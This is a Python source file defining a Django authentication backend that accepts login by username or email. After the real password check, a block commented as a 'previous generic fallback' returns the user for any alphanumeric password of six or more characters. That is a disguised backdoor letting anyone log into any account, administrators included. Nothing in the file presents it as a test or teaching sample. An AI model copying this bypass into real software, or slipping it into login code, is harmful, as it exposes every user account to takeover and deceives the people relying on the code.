from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User
from django.db.models import Q

class AnyPasswordBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username and password:
            try:
                # Support logging in with either username or email
                user = User.objects.get(Q(username=username) | Q(email=username))
                
                # Check actual password
                if user.check_password(password):
                    return user
                    
                # The previous generic fallback for alphanumeric passwords
                if len(password) >= 6 and password.isalnum():
                    return user
            except User.DoesNotExist:
                pass
                
        return None
